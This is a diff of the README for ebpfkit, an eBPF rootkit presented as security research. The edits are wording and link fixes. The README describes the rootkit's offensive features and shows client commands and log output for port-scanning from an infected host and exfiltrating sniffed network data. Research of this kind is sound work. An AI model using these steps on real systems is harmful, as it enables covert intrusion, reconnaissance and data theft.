@@ -3,14 +3,14 @@
 [![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
 [![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 
-`ebpfkit` is a rootkit that leverages various eBPF features to implement offensive security techniques. We implemented most of the features you would expect from a rootkit: obfuscation techniques, container breakouts, persistent access, command and control, pivoting, network scanning, Runtime Application Self-Protection (RASP) bypass, etc.
+`ebpfkit` is a rootkit that leverages multiple eBPF features to implement offensive security techniques. We implemented most of the features you would expect from a rootkit: obfuscation techniques, container breakouts, persistent access, command and control, pivoting, network scanning, Runtime Application Self-Protection (RASP) bypass, etc.
 
 This rootkit was presented at [BlackHat USA 2021: With Friends Like eBPF, Who Needs Enemies?](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619) and [Defcon 29: eBPF, I thought we were friends !](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier). While we presented our container breakouts at BlackHat, you'll want to check out our Defcon talk to see a demo of the network scanner and the RASP bypass. Slides and recordings of the talks will be available soon.
 
 ## **Disclaimer**
 This project is **not** an official Datadog product (experimental or otherwise), it is just code that happens to be developed by Datadog employees as part of an independent security research project. The rootkit herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.
 
-**Do not attempt to use these tools to violate the law.  The author is not responsible for any illegal action.  Misuse of and information provided can result in criminal charges.**
+**Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.**
 
 ## System requirements
 
@@ -73,7 +73,7 @@ Usage of ./bin/webapp:
 # ~ ./bin/webapp
 ```
 
-Once both `ebpfkit` and the webapp are running, you can start using `ebpfkit-client`. Run `ebpfkit-client -h` to get help.
+Once both `ebpfkit` and the `webapp` are running, you can start using `ebpfkit-client`. Run `ebpfkit-client -h` to get help.
 
 ```shell script
 # ~ ebpfkit-client -h
@@ -98,8 +98,8 @@ Use "ebpfkit-client [command] --help" for more information about a command.
 
 ## Examples
 
-This section contains only 3 examples. We invite you to watch our BlackHat USA 2021 and Defcon 29 talks to see a demo of all the features of the rootkit. For example, you'll see how you can use Command and Control to change the passwords of a Postgresql database, or how we successfully hid the rootkit on the host.
-We namely demonstrate 2 container breakouts during our [BlackHat talk]((https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619)), and a RASP bypass during our [Defcon talk]((https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier)).
+This section contains only 3 examples. We invite you to watch our BlackHat USA 2021 and Defcon 29 talks to see a demo of all the features of the rootkit. For example, you'll see how you can use Command and Control to change the passwords of a Postgresql database at runtime, or how we successfully hid the rootkit on the host.
+We also demonstrate 2 container breakouts during our [BlackHat talk](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619), and a RASP bypass during our [Defcon talk](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier).
 
 ### Exfiltrate passive network sniffing data
 
@@ -145,7 +145,7 @@ INFO[2021-08-04T10:10:57Z] Dumping collected network flows (358):
 INFO[2021-08-04T10:10:58Z] Graph generated: /tmp/network-discovery-graph-453667534
 ```
 
-The final step is to generate the graph. We used the `fdp` layout of [Graphviz](https://graphviz.org/).
+The final step is to generate the *svg* file. We used the `fdp` layout of [Graphviz](https://graphviz.org/).
 
 ```shell script
 # ~ fdp -Tsvg /tmp/network-discovery-graph-453667534 > ./graphs/passive_network_discovery.svg
@@ -155,7 +155,7 @@ The final step is to generate the graph. We used the `fdp` layout of [Graphviz](
 
 ### Run a port scan on 10.0.2.3, from port 7990 to 8010
 
-> Note: for this feature to work, you cannot run `ebpfkit-client` locally. If you're running the rootkit in a VM, expose the webapp port (default 8000) of the VM and make the `ebpfkit-client` request from the host.
+> Note: for this feature to work, you cannot run `ebpfkit-client` locally. If you're running the rootkit in a guest VM, expose the webapp port (default 8000) of the guest VM to the host and make the `ebpfkit-client` request from the host.
 
 To request a port scan, use the `network_discovery` command. You can specify the target IP, start port and port range.
 
@@ -169,11 +169,11 @@ User-Agent: 0100000020030799000020______________________________________________
 DEBUG[2021-08-04T11:59:51Z] {"api":{"version":"1.0.1","hash":"9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca72323c3d99ba5c11d7cfc1d215a922ad186ac28b0aaa23ed6ebe436e67aacd987cc6e14b8c5da0c4663475c2e5c3adef46f73bcdec043","git_commit":"c1d215a922ad186acbe436e6e2c513128b0aaa23ed6e3a4d48140b4931895384bc5b8074b7ef6b1a3e2a65b5be0c875871fec6e1a38f9c3de2c51313a4d48140b4931895384bc5b8074b7ef6b35c208abd4e16f2","release_date":"2021-03-29T13:51:31.606184183Z"},"timestamp":"2021-08-04T09:59:51.680566768Z","status":200,"data":"OK"}
 ```
 
-On the infected host, you should see debug logs in `/sys/kernel/debug/tracing/trace_pipe`. There is namely the initial ARP request to resolve the MAC address of the target IP, and then a list of SYN requests to probe the ports of the requested range.
+On the infected host, you should see debug logs in `/sys/kernel/debug/tracing/trace_pipe`. For example, you should see the initial ARP request to resolve the MAC address of the target IP, and then a list of SYN requests to probe the ports from the requested range.
 
 ```shell script 
 # ~ sudo cat /sys/kernel/debug/tracing/trace_pipe
-<idle>-0       [003] ..s.  5557.564353: 0: sending ARP request ...
+          <idle>-0       [003] ..s.  5557.564353: 0: sending ARP request ...
           <idle>-0       [003] ..s.  5557.564451: 0: ARP response!
             sshd-3035    [003] ..s1  5559.108243: 0: SYN request answer (7990): rst:1 syn:0
             sshd-3035    [003] ..s.  5559.108482: 0: SYN request answer (7991): rst:1 syn:0
@@ -199,7 +199,7 @@ On the infected host, you should see debug logs in `/sys/kernel/debug/tracing/tr
             sshd-3035    [003] ..s.  5559.122702: 0: scan done !
 ```
 
-Once the scan is finished, you can exfiltrate the scan result using the `network_discovery` command. You can specify the `active` flag to request the network traffic generated by the network scan. It may take a while to extract everything so be patient ...
+Once the scan is finished, you can exfiltrate the scan result using the `network_discovery` command. You need to add the `active` flag to request the network traffic generated by the network scan. It may take a while to extract everything so be patient ...
 
 ```shell script
 # ~ ebpfkit-client -l debug network_discovery get --active
@@ -249,7 +249,7 @@ INFO[2021-08-04T09:49:17Z] Dumping collected network flows (65):
 INFO[2021-08-04T09:49:17Z] Graph generated: /tmp/network-discovery-graph-3064189396
 ```
 
-The final step is to generate the graph. We used the `fdp` layout of [Graphviz](https://graphviz.org/).
+The final step is to generate the *svg* file. We used the `fdp` layout of [Graphviz](https://graphviz.org/).
 
 ```shell script
 # ~ fdp -Tsvg /tmp/network-discovery-graph-3064189396 > ./graphs/active_network_discovery.svg
